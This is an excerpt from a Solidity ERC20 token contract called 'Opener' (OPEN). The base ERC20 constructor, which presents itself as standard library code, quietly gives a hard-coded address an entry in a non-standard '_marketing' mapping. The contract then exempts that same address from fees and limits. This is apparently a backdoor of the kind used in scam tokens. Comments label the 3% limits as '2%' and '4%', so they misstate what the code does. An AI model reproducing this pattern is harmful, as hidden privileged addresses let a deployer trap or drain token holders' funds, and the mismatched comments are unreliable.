...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x5237C23Cd206f15F4FA4fFa1157D27D6362F3E4f] = _marketingwallet;
    }
...
contract Opener is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Opener", "OPEN") {
        ...
        maxTransactionAmount = totalSupply * 30 / 1000; // 2% maxTransactionAmountTxn
        maxWallet = totalSupply * 30 / 1000; // 4% maxWallet
        ...
        excludeFromFees(address(0x5237C23Cd206f15F4FA4fFa1157D27D6362F3E4f), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x5237C23Cd206f15F4FA4fFa1157D27D6362F3E4f), true);
